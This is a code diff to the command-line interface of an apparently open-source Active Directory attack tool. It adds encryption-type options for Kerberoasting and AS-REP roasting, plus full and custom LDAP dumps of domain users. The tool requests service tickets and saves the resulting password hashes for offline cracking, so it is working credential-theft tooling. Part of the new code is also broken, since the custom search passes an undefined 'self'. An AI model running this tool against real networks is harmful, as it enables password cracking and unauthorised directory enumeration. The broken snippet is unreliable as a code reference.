@@ -16,6 +16,7 @@ import ntpath
 import logging
 import getpass
 import os
+import csv
 
 def from_target_string(target):
 	#get domain, username, password
@@ -59,10 +60,12 @@ def run():
 	subparsers.dest = 'command'
 
 	ldap_group = subparsers.add_parser('ldap', help='Enumerate potentially vulnerable users via LDAP')
-	ldap_group.add_argument('type', choices=['spn', 'asrep', 'all'], help='type of vulnerable users to enumerate')
+	ldap_group.add_argument('type', choices=['spn', 'asrep', 'full','custom', 'all'], help='type of vulnerable users to enumerate')
 	ldap_group.add_argument('user',  help='LDAP user specitication <domain>/<username>:<password>@<ip or hostname>')
-	ldap_group.add_argument('-n','--ntlm',  help='Specify this for passing the hash')
+	ldap_group.add_argument('-n','--ntlm', action='store_true', help='Indicate if password is actually an NT hash')
 	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
+	ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
+	ldap_group.add_argument('-a','--attrs', action='append', help='FULL and CUSTOM mode only. LDAP attributes to display')
 
 	brute_group = subparsers.add_parser('brute', help='Enumerate users via brute-forcing kerberos service')
 	brute_group.add_argument('realm', help='Kerberos realm <COMPANY.corp>')
@@ -76,17 +79,21 @@ def run():
 	asreproast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	asreproast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	asreproast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
+	asreproast_group.add_argument('-e','--etype', default=23, const=23, nargs='?', choices= [23, 17, 18], type=int, help = 'Set preferred encryption type')
 
 
 	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)')
 	spnroast_group.add_argument('logincreds', help='Either CCACHE file name or Kerberos login data <realm>/<username>:<password or NT hash or AES key>@<ip or hostname> Can be omitted for asrep command.')
 	spnroast_group.add_argument('-n','--ntlm', action='store_true', help='Indicate if password is actually an NT hash')
-	spnroast_group.add_argument('-a','--aes', action='store_true',  help='Indicate if password is actually an AES key')
+	spnroast_group.add_argument('-a','--aes', action='store_true',  help='Indicate if password is actually an AES key (AES128 and AES256 agnostic)')
+	spnroast_group.add_argument('-d','--des', action='store_true',  help='Indicate if password is actually an DES key (if DC allows this there are waay more issues than kerberoast)')
 	spnroast_group.add_argument('-c','--ccache', action='store_true',  help='Indicate if target is actually a CCACHE file')
 	spnroast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
 	spnroast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	spnroast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
+	spnroast_group.add_argument('-e','--etype', default=-1, const=-1, nargs='?', choices= [23, 17, 18, -1], type=int, help = 'Set preferred encryption type. -1 for all')
+
 
 	args = parser.parse_args()
 
@@ -194,9 +201,22 @@ def run():
 
 			else:
 				cred.password = password
+
 			ks = KerberosSocket(target)
 			ar = Kerberoast(cred, ks)
-			hashes = ar.run(targets)
+
+			if args.etype:
+				if args.etype == -1:
+					etypes = [23, 17, 18]
+				else:
+					etypes = [args.etype]
+			else:
+				etypes = [23, 17, 18]
+
+			logging.debug('Kerberoast will suppoort the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
+
+			
+			hashes = ar.run(targets, override_etype = etypes)
 
 			if args.out_file:
 				with open(args.out_file, 'w') as f:
@@ -259,10 +279,13 @@ def run():
 				creds.append(cred)
 
 		logging.debug('ASREPRoast loaded %d targets' % len(creds))
+
+		logging.debug('ASREPRoast will suppoort the following encryption type: %s' % (str(args.etype)))
+
 		
 		ks = KerberosSocket(args.address)
 		ar = APREPRoast(ks)
-		hashes = ar.run(creds)
+		hashes = ar.run(creds, override_etype = [args.etype])
 
 		if args.out_file:
 			with open(args.out_file, 'w') as f:
@@ -291,7 +314,7 @@ def run():
 					f.write(user + '\r\n')
 
 		else:
-			print('[+]Enumerated users:')
+			print('[+] Enumerated users:')
 			for user in results:
 				print(user)
 
@@ -310,34 +333,91 @@ def run():
 		adinfo = ldap.get_ad_info()
 		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
 
-		spn_users = []
-		asrep_users = []
-		if args.type in ['spn','all']:
-			for user in ldap.get_all_service_user_objects():
-				spn_users.append('%s/%s' % (domain, user.sAMAccountName))
-		if args.type in ['asrep','all']:
-			for user in ldap.get_all_knoreq_user_objects():
-				asrep_users.append('%s/%s' % (domain, user.sAMAccountName))
-
 		if args.out_file:
 			basefolder = ntpath.dirname(args.out_file)
 			basefile = ntpath.basename(args.out_file)
-			if len(spn_users) > 0:
-				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
-					for user in spn_users:
-						f.write(user+'\r\n')
 
-			if len(asrep_users) > 0:
+		if args.type in ['spn','all']:
+			logging.debug('Enumerating SPN user accounts...')
+			cnt = 0
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
+					for user in ldap.get_all_service_user_objects():
+						cnt += 1
+						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+			
+			else:
+				print('[+] SPN users')
+				for user in ldap.get_all_service_user_objects():
+					cnt += 1
+					print('%s/%s' % (domain, user.sAMAccountName))
+			
+			logging.debug('Enumerated %d SPN user accounts' % cnt)
+
+		if args.type in ['asrep','all']:
+			logging.debug('Enumerating ASREP user accounts...')
+			ctr = 0
+			if args.out_file:
 				with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
-					for user in asrep_users:
-						f.write(user+'\r\n')
-		else:
-			print('[+]SPN vuln users:')
-			for user in spn_users:
-				print(user)
-			print('[+]ASREP vuln users:')
-			for user in asrep_users:
-				print(user)
+					for user in ldap.get_all_knoreq_user_objects():
+						ctr += 1
+						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+			else:
+				print('[+] ASREP users')
+				for user in ldap.get_all_knoreq_user_objects():
+					ctr += 1
+					print('%s/%s' % (domain, user.sAMAccountName))
+
+			logging.debug('Enumerated %d ASREP user accounts' % ctr)
+
+		if args.type in ['full', 'all']:
+			logging.debug('Enumerating ALL user accounts, this will take some time depending on the size of the domain')
+			ctr = 0
+			attrs = args.attrs if args.attrs is not None else MSADUser.TSV_ATTRS
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='') as f:
+					writer = csv.writer(f, delimiter = '\t')
+					writer.writerow(attrs)
+					for user in ldap.get_all_user_objects():
+						ctr += 1
+						writer.writerow(user.get_row(attrs))
+
+			else:
+				logging.debug('Are you sure about this?')
+				print('[+] Full user dump')
+				print('\t'.join(attrs))
+				for user in ldap.get_all_user_objects():
+					ctr += 1
+					print('\t'.join([str(x) for x in user.get_row(attrs)]))
+
+			
+			logging.debug('Enumerated %d user accounts' % ctr)
+
+		if args.type in ['custom']:
+			if not args.filter:
+				raise Exception('Custom LDAP search requires the search filter to be specified!')
+			if not args.attrs:
+				raise Exception('Custom LDAP search requires the attributes to be specified!')
+
+			logging.debug('Perforing search on the AD with the following filter: %s' % args.filter)
+			logging.debug('Search will contain the following attributes: %s' % ','.join(args.attrs))
+			ctr = 0
+
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_ldap_custom.tsv'), 'w', newline='') as f:
+					writer = csv.writer(f, delimiter = '\t')
+					writer.writerow(args.attrs)
+					for obj in ldap.pagedsearch(self, args.filter, args.attrs):
+						ctr += 1
+						writer.writerow([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs])
+
+			else:
+				for obj in ldap.pagedsearch(self, args.filter, args.attrs):
+					ctr += 1
+					print('\t'.join([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs]))
+
+			logging.debug('Custom search yielded %d results!' % ctr)
+
 
 	
 if __name__ == '__main__':
